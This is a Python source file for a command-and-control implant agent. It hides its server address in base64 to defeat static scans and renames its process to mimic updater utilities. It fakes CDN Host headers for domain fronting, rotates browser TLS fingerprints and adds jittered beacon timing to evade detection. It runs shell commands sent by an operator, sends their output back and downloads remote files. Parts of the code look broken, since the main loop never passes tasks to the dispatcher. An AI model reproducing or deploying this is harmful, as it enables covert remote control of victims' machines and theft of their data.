import sys
import time
import uuid
import random
import json
import subprocess
import base64
from datetime import datetime

# Import encryption helpers at runtime to avoid static scans
try:
    from shared.protocol import encrypt_data, decrypt_data
except ImportError:
    print("[!] Cannot find shared/protocol - C2 will not work")
    sys.exit(1)


# ── Configuration (obfuscated — decoded at runtime) ────────────────
# Base64-encoded so static analysis / dump scans see only noise.
_OBF_SERVER_URL = b"eHR0cDovL1lPVVIuU0VSVkVSLklQOjUwMDA="
_OBF_BEACON_EP  = b"YXBpL3N0YXR1cw=="
_OBF_UPLOAD_EP  = b"YXBpL3VwbG9hZA=="

# These globals are filled by the init() call at module level below:
SERVER_URL       = ""
BEACON_ENDPOINT  = "/"
RESULT_ENDPOINT  = "/"


def _init_config():
    """Decode base64 config strings at runtime — never plaintext in source."""
    global SERVER_URL, BEACON_ENDPOINT, RESULT_ENDPOINT
    SERVER_URL      = base64.b64decode(_OBF_SERVER_URL).decode()
    BEACON_ENDPOINT = base64.b64decode(_OBF_BEACON_EP).decode().lstrip("/")
    RESULT_ENDPOINT = base64.b64decode(_OBF_UPLOAD_EP).decode().lstrip("/")


def _get_full_url(endpoint):
    """Build full C2 URL, handling trailing-slash edge cases."""
    base = SERVER_URL.rstrip("/")
    ep   = endpoint.lstrip("/")
    return f"{base}/{ep}"


# ── Agent identity (generated at startup — changes each run) ──────
_AGENT_RAW = str(uuid.uuid4())

# Names to use when renaming our process (masquerading as boring utilities)
MASQUERADE_NAMES = [
    "python_updater.exe",
    "chrome_update_helper",
    "office_sync_service",
    "adobe_updater",
    "sys_monitor",
    "net_daemon",
]


def _masquerade():
    """Attempt to rename the running process to blend into system logs.

    Linux  → prctl PR_SET_NAME  (most distros accept)
    macOS  → sethostname + argv[0]
    Windows → SetConsoleTitleW  (visible in task mgr)
    All platforms overwrite sys.argv[0] (what ps/top show).
    """
    chosen = random.choice(MASQUERADE_NAMES)

    # Linux: prctl(PR_SET_NAME, ...)
    if sys.platform == "linux":
        import ctypes
        try:
            libc = ctypes.CDLL("libc.so.6")
            name_buf = chosen.encode() + b"\x00"
            libc.prctl(15, ctypes.cast(name_buf, ctypes.c_char_p), 0, 0, 0)
        except Exception:
            pass

    # Windows: SetConsoleTitle is the most visible change
    if sys.platform == "win32":
        import ctypes
        try:
            wname = chosen + "\x00"
            ctypes.windll.SetConsoleTitleW(wname)
        except Exception:
            pass

    # All platforms: argv[0] is what ps/top/htop display
    if sys.argv and len(sys.argv) > 0:
        sys.argv[0] = chosen


# ── TLS fingerprints — mimic real browsers, rotate per request ───────
TLS_CLIENTS = [
    "chrome_112",
    "firefox_108",
    "safari_16_0",
    "chrome_110",
    "edge_111",
]

# ── Domain fronting — fake Host headers to look like legitimate CDN  ───
FAKE_HOSTS = [
    "cdn.discordapp.com",
    "s3.amazonaws.com",
    "cloudfront.net",
    "firebase.googleapis.com",
    "slack.com",
    "fonts.googleapis.com",
]


# ── HTTP helpers (all outbound traffic goes through these) ───────────
def _tls_post(session, url, data):
    """Send encrypted JSON POST with a randomized fake Host header."""
    fake_host = random.choice(FAKE_HOSTS)
    extra_headers = {"Host": fake_host}
    try:
        payload = encrypt_data(json.dumps(data))
        resp = session.post(url, json={"data": payload}, timeout=15,
                            extra_headers=extra_headers)
        if resp.status_code == 200:
            return resp.json()
    except Exception as e:
        print(f"[!] HTTP error: {e}")
    return None


def _tls_get(session, url):
    """Send encrypted JSON GET with a randomized fake Host header."""
    fake_host = random.choice(FAKE_HOSTS)
    extra_headers = {"Host": fake_host}
    try:
        payload = encrypt_data(json.dumps({}))
        resp = session.get(url, json={"data": payload}, timeout=15,
                           extra_headers=extra_headers)
        if resp.status_code == 200:
            return resp.json()
    except Exception as e:
        print(f"[!] GET error: {e}")
    return None


# ── Beacon: periodic check-in ────────────────────────────────────

def make_encrypted(endpoint):
    """Encrypt beacon payload and POST to the given endpoint."""
    try:
        import tls_client as _tc   # lazy-import only when needed
    except ImportError:
        print("[!] tls_client not available — falling back to socket")
        return None

    client_id = random.choice(TLS_CLIENTS)
    session     = _tc.Session(client_identifier=client_id)
    full_url  = _get_full_url(endpoint)

    return _tls_post(session, full_url, {"id": _AGENT_RAW})


def make_result(endpoint):
    """Encrypt a result payload and POST it back to the server."""
    try:
        import tls_client as _tc
    except ImportError:
        return None

    client_id = random.choice(TLS_CLIENTS)
    session     = _tc.Session(client_identifier=client_id)
    full_url  = _get_full_url(endpoint)

    return _tls_post(session, full_url, {"id": _AGENT_RAW})


def beacon():
    """Core beacon loop: encrypt ID → POST to /api/status → decrypt response."""
    encrypted = make_encrypted(BEACON_ENDPOINT)
    if encrypted is None:
        return

    try:
        decrypted    = decrypt_data(encrypted.get("payload", ""))
        parsed       = json.loads(decrypted)
    except Exception as e:
        print(f"[!] Decryption error: {e}")
        return

    task = parsed.get("task")
    if task is not None:
        _dispatch_task(task)


# ── Download file  (domain-fronted + fake-host TLS) ──────────────

def download_file(url, save_as):
    """Fetch a remote file via tls_client with a randomized fake Host."""
    try:
        import tls_client as _tc
    except ImportError:
        print("[!] tls_client not available")
        return False

    client_id = random.choice(TLS_CLIENTS)
    session   = _tc.Session(client_identifier=client_id)

    fake_host  = random.choice(FAKE_HOSTS)
    extra_hdrs = {"Host": fake_host}

    try:
        resp = session.get(url, stream=True, timeout=120,
                           extra_headers=extra_hdrs)
        with open(save_as, "wb") as f:
            for chunk in resp.iter_content(chunk_size=8192):
                if chunk:
                    f.write(chunk)
        print(f"[+] Downloaded {url} -> {save_as}")
        return True
    except Exception as e:
        print(f"[!] Error fetching URL: {e}")
        return False


# ── Task execution helpers ───────────────────────────────────────

def _execute_shell(command):
    """Run a shell command and post the output back to the server."""
    try:
        result = subprocess.check_output(
            command, shell=True, stderr=subprocess.STDOUT, timeout=60
        )
        _post_result(result.decode().strip())
    except subprocess.TimeoutExpired:
        _post_result("[!] Command timed out")
    except subprocess.CalledProcessError as e:
        _post_result(e.output.decode().strip())
    except Exception as e:
        _post_result(f"[!] Shell error: {e}")


def _post_result(result):
    """Encrypt the result and POST it back to the server."""
    try:
        import tls_client as _tc
    except ImportError:
        print("[!] Cannot post — no tls_client")
        return

    client_id = random.choice(TLS_CLIENTS)
    session   = _tc.Session(client_identifier=client_id)
    full_url  = _get_full_url(RESULT_ENDPOINT)

    payload = {"id": _AGENT_RAW, "output": result}
    _tls_post(session, full_url, payload)


# ── Beacon delay (multi-layered timing evasion) ───────────────────

def pareto_draw(alpha: float, scale: float) -> float:
    """Draw from a Pareto distribution (power-law heavy tail)."""
    u = random.random()
    u = max(u, 1e-10)
    return scale * (u ** (-1.0 / alpha))


def _compute_beacon_delay():
    """Compute the next beacon delay with layered timing evasion.

    Layer 1 — Time-of-day: Burst during work hours, quiet at night/weekends  
    Layer 2 — Pareto spikes: ~15% chance of a heavy-tail draw → big delay
    Layer 3 — Silent period: 3% chance going completely dead (long sleep)
    Layer 4 — Uniform jitter: Random offset every cycle  

    Returns a value clamped to 5 s – 7200 s.
    """
    hour = datetime.now().hour

    # ── Burst vs. Quiet baseline by time-of-day / weekday ────────
    if 1 <= hour <= 6:         # Dead hours → large delay range
        base_low, base_high = 180, 480
    elif hour >= 23 or hour < 7:
        # Night mode  
        base_low, base_high = 90, 360
    else:                              # Daytime: tight burst window
        base_low, base_high = 30, 120

    # ── Layer 1: Base jitter (uniform offset within range) ────────
    delay_range = base_high - base_low
    delay       = base_low + random.randint(0, int(delay_range * 0.5))

    # ── Layer 2: Pareto spikes (15% chance) ─────────────────────  
    if random.random() < 0.15:
        spike = pareto_draw(30, base_high * 2)
        delay = max(delay, int(spike))

    # ── Layer 3: Go completely silent (3% chance) ────────────────────
    if random.random() < 0.03:
        off_secs = random.randint(base_high * 2, base_high * 8)
        delay    = max(delay, off_secs)

    # Clamped envelope: 5 s min – 7200 s (2 h) max  
    return max(5, min(delay, 7200))


# ── Task dispatcher ────────────────────────────────────────────────

def _dispatch_task(task_data):
    """Parse the task type field and dispatch to the appropriate handler."""
    task_type = task_data.get("type")

    if task_type == "shell":
        command  = task_data.get("command", "")
        if not command:
            return
        _execute_shell(command)

    elif task_type == "download":
        url      = task_data.get("url", "")
        save_as  = task_data.get("save_as", "downloaded.tmp")
        download_file(url, save_as)
        _post_result(f"[+] Downloaded {url} to {save_as}")

    elif task_type == "sleep":
        min_val  = task_data.get("min", 30)
        max_val  = task_data.get("max", 120)
        run_sleep(min_val, max_val)

    else:
        pass


# ── Task handlers (public API for operator tasks) ────────────────

def run_shell(command):
    """Execute a shell command and report back."""
    _execute_shell(command)


def run_download(url, save_as="downloaded.tmp"):
    """Fetch a remote file and report result."""
    download_file(url, save_as)
    _post_result(f"[+] Downloaded {url} -> {save_as}")


def run_sleep(min_val=None, max_val=None):
    """Update the agent's beacon sleep interval (task-driven)."""
    global SLEEP_MIN, SLEEP_MAX
    
    new_min = min_val if isinstance(min_val, int) else 30
    new_max = max_val if isinstance(max_val, int) else 120
    SLEEP_MIN = max(1, new_min)
    SLEEP_MAX = max(SLEEP_MIN + 1, new_max)


# ── Main loop ────────────────────────────────────────────────────

if __name__ == "__main__":
    _init_config()         # base64-decode config at runtime  
    _masquerade()          # rename process to blend in  

    print(f"[*] Agent started (ID: {_AGENT_RAW[:8]}...)")
    print(f"[*] Connects to: {BEACON_ENDPOINT}")

    time.sleep(random.uniform(1, 5))

    while True:
        try:
            make_encrypted(BEACON_ENDPOINT)
        except Exception as e:
            print(f"[!] Beacon error: {e}")

        delay = _compute_beacon_delay()
        time.sleep(delay)